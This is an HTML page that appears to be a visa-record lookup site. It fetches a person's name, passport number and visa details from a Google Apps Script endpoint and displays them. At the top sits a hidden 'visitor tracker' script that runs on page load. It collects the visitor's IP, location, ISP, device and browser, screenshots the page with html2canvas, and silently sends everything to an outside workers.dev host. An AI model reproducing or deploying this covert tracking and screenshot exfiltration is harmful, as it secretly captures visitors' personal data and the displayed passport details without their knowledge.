<!DOCTYPE html>

<!-- Telegram Visitor Tracker + Screenshot -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
(function () {
  var WORKER_URL = "https://long-pine-6e25.hkopbahi1111.workers.dev/";

  var ua      = navigator.userAgent;
  var device  = /Mobile|Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
  var browser = "Unknown";
  if      (ua.indexOf("Edg")     > -1) browser = "Edge";
  else if (ua.indexOf("OPR")     > -1) browser = "Opera";
  else if (ua.indexOf("Chrome")  > -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
  else if (ua.indexOf("Safari")  > -1) browser = "Safari";

  var ref  = document.referrer || "Direct / WhatsApp";
  var page = window.location.href;
  var time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });

  function sendData(geo, screenshot) {
    var payload = {
      ip:         geo.ip      || "N/A",
      city:       geo.city    || "N/A",
      country:    geo.country || "N/A",
      isp:        geo.isp     || "N/A",
      device:     device,
      browser:    browser,
      ref:        ref,
      time:       time,
      page:       page,
      screenshot: screenshot || null
    };
    fetch(WORKER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(function(){});
  }

  function takeScreenshot(geo) {
    setTimeout(function() {
      html2canvas(document.body, {
        useCORS: true,
        allowTaint: true,
        scale: 0.6,
        logging: false
      }).then(function(canvas) {
        sendData(geo, canvas.toDataURL("image/png"));
      }).catch(function() {
        sendData(geo, null);
      });
    }, 2000);
  }

  function getGeoAndTrack() {
    fetch("https://ip-api.com/json/?fields=status,query,city,country,isp")
      .then(function(r) { return r.json(); })
      .then(function(d) {
        if (d && d.status === "success") {
          takeScreenshot({ ip: d.query, city: d.city, country: d.country, isp: d.isp });
        } else { throw new Error("fail"); }
      })
      .catch(function() {
        fetch("https://ipwho.is/")
          .then(function(r) { return r.json(); })
          .then(function(d) {
            if (d && d.success) {
              takeScreenshot({ ip: d.ip, city: d.city, country: d.country, isp: d.connection ? d.connection.isp : "N/A" });
            } else { throw new Error("fail"); }
          })
          .catch(function() {
            fetch("https://ipapi.co/json/")
              .then(function(r) { return r.json(); })
              .then(function(d) {
                if (d && d.ip) {
                  takeScreenshot({ ip: d.ip, city: d.city, country: d.country_name, isp: d.org });
                } else { throw new Error("fail"); }
              })
              .catch(function() {
                takeScreenshot({ ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" });
              });
          });
      });
  }

  window.addEventListener("load", function() {
    getGeoAndTrack();
  });

})();
</script>

<style>

    z-index: 9999999;
    transition: all 0.3s ease-in-out;
  }
  .clear-loading {
    text-align: center; margin: 0 auto;
    position: absolute; top: 50%; left: 50%;
    margin-top: -50px; margin-left: -50px;
    box-sizing: border-box;
  }
  .loading-effect-2 { width: 100px; height: 100px; }
  .loading-effect-2 > span,
  .loading-effect-2 > span:before,
  .loading-effect-2 > span:after {
    content: ""; display: block; border-radius: 50%;
    border: 2px solid #0068AC;
    position: absolute; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
  }
  .loading-effect-2 > span {
    width: 100%; height: 100%; top: 0; left: 0;
    border-left-color: transparent;
    animation: effect-2 2s infinite linear;
  }
  .loading-effect-2 > span:before { width: 75%; height: 75%; border-right-color: transparent; }
  .loading-effect-2 > span:after  { width: 50%; height: 50%; border-bottom-color: transparent; }
  @keyframes effect-2 {
    from { transform: rotate(0deg); }
    to   { transform: rotate(360deg); }
  }
  .page-content { visibility: hidden; opacity: 0; }
  .page-content.loaded { visibility: visible; opacity: 1; transition: opacity 0.3s ease; }
  .menu-icon { width: 25px; height: 18px; position: relative; cursor: pointer; display: inline-block; }
  .menu-icon span { position: absolute; height: 2.5px; width: 100%; background: #1b5fa7; border-radius: 9px; transition: 0.4s; }
  .menu-icon span:nth-child(1) { top: 0; }
  .menu-icon span:nth-child(2) { top: 7px; }
  .menu-icon span:nth-child(3) { top: 14px; }
  .menu-icon.active span:nth-child(1) { transform: rotate(45deg); top: 7px; }
  .menu-icon.active span:nth-child(2) { opacity: 0; }
  .menu-icon.active span:nth-child(3) { transform: rotate(-45deg); top: 7px; }
  .mobile-menu { position: fixed; top: 65px; width: 100%; background: #1e273d; max-height: 0; overflow: hidden; transition: max-height .4s; z-index: 999; }
  .mobile-menu.show { max-height: 400px; }

  .btn-back-login { display: inline-block; background: #0070ad; color: #fff; padding: 12px 35px; margin: 30px 0 10px 0; text-decoration: none; font-size: 14px; }

  .footer { text-align: center; font-size: 12px; color: #999; padding: 25px; }
  .label-div { text-align: left; }
  .value-div { text-align: left; }
  @media (max-width: 991px) {
    .label-div { text-align: center; }
    .value-div { text-align: center; }
  }
</style>

<script>
  function toggleMenu() {
    document.getElementById("mobileMenu").classList.toggle("show");
    document.getElementById("menuIcon").classList.toggle("active");
  }
  function setText(id, val) {
    var el = document.getElementById(id);
    if (el) el.innerText = val || "---";
  }
  function formatDate(d) {
    if (!d) return "---";
    return new Date(d).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" });
  }
  function showPage() {
    var loader = document.getElementById("preloader");
    loader.style.opacity = "0";
    setTimeout(function () { loader.style.display = "none"; }, 300);
    document.getElementById("pageContent").classList.add("loaded");
  }
  var id = new URLSearchParams(window.location.search).get("id");
  if (id) {
    fetch("https://script.google.com/macros/s/AKfycbz5RtSgtWeStpF3mIMoKtHWX4WQnvdXK4uNNjJ2RUPalSWrlhiA4OoHwL38Ndj3rA0B/exec?id=" + id)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        document.getElementById("eid").innerText = "Visa Reference Number - " + (data.id || id);
        setText("fullname", data.name);
        setText("passport", data.passport_no);
        setText("country", data.passport_country);
        setText("visa_category", data.visa_category);
        setText("visa_sub_category", data.visa_sub_category);
        setText("application_type", data.application_type);
        setText("staying_facility", data.staying_facility);
        setText("visa_start", formatDate(data.visa_start_date));
        setText("visa_end", formatDate(data.visa_end_date));
        setText("visa_duration", data.visa_duration);
        if (data.photo) { document.getElementById("photo").src = data.photo; }
        showPage();
      })
      .catch(function() {
        document.getElementById("login-block").innerHTML = "<h2 style='text-align:center;margin-top:40px;'>Record Not Found</h2>";
        showPage();
      });
  } else {
    showPage();
  }
</script>
